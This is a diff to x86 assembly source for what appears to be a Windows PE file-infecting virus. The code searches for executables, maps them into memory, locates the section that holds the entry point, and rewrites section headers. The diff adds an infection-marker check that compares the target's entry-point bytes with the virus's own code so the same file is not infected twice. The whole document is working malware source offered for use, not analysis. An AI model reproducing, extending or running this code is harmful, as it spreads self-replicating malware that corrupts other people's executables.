@@ -293,7 +293,38 @@ loop_find_file:
 	mul ecx ; eax = (sizeof IMAGE_SECTION_HEADER * NumberOfSections)
 	lea edx, (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader
 	add dx, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).SizeOfOptionalHeader
+	mov ecx, edx ; save first section header
 	add edx, eax
+	;
+	mov (STACK_STORAGE PTR [esp]).filePeHeader, edi
+	mov (STACK_STORAGE PTR [esp]).fileLastSectionHeader, edx
+
+	; check if infector or already infected
+	mov eax, ebx
+	add eax, (start - data)
+	; get physical entry point address
+	sub ecx, sizeof IMAGE_SECTION_HEADER
+find_entrypoint_section_loop:
+	add ecx, sizeof IMAGE_SECTION_HEADER
+	mov edx, (IMAGE_SECTION_HEADER PTR [ecx]).VirtualAddress
+	add edx, (IMAGE_SECTION_HEADER PTR [ecx]).Misc
+	cmp edx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint
+	jl find_entrypoint_section_loop
+	mov edx, (IMAGE_SECTION_HEADER PTR [ecx]).VirtualAddress
+	sub edx, (IMAGE_SECTION_HEADER PTR [ecx]).PointerToRawData
+	mov ecx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint
+	add ecx, (STACK_STORAGE PTR [esp]).fileView
+	sub ecx, edx
+	;
+	push end_of_code - start
+	push ecx
+	push eax
+	call lstrncmp
+	cmp al, 0
+	jne close_target
+
+	mov edi, (STACK_STORAGE PTR [esp]).filePeHeader
+	mov edx, (STACK_STORAGE PTR [esp]).fileLastSectionHeader
 	;
 	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Characteristics
 	; set as code
@@ -412,9 +443,9 @@ loop_find_file_end:
 	add sp, dx ; "free" the stack
 	jmp eax
 
+; ret : function address
 ; arg1: function name
 ; arg2: STACK_STORAGE struct
-; ret : function address
 GetProcAddr:
 	pop eax ; ret
 	pop ecx ; arg1
@@ -427,9 +458,9 @@ GetProcAddr:
 	pop edx
 	jmp edx
 
+; ret : none
 ; arg1: file size
 ; arg2: STACK_STORAGE struct
-; ret : none
 MapFileToRAM:
 	; use of offsets on esp, because the arguments
 	; and return address are on the stack
@@ -472,8 +503,8 @@ MapFileToRAM:
 	pop ecx
 	jmp edx
 
-; arg1: STACK_STORAGE struct
 ; ret : none
+; arg1: STACK_STORAGE struct
 UnmapFileFromRAM:
 	push [esp + (sizeof DWORD * 1)]
 	lea eax, [ebx + (UnmapViewOfFile_str - data)]
@@ -496,6 +527,37 @@ UnmapFileFromRAM:
 	pop edx
 	pop ecx
 	jmp edx
+
+; ret : bool
+; arg1: string1
+; arg2: string2
+; arg3: length
+lstrncmp:
+	xor esi, esi ; string offset
+	xor eax, eax
+lstrncmp_loop:
+	cmp esi, [esp + (sizeof DWORD * 3)]
+	je lstrncmp_end_equal
+	mov ecx, [esp + (sizeof DWORD * 1)]
+	mov cl, [ecx + esi]
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov dl, [edx + esi]
+	cmp cl, dl
+	jne lstrncmp_end_not_equal
+	inc esi
+	jmp lstrncmp_loop
+lstrncmp_end_equal:
+	mov al, 1
+	jmp lstrncmp_end
+lstrncmp_end_not_equal:
+	mov al, 0
+lstrncmp_end:
+	pop edx
+	pop ecx
+	pop ecx
+	pop ecx
+	jmp edx
+
 
 end_of_code:
 	add sp, dx ; "free" the stack
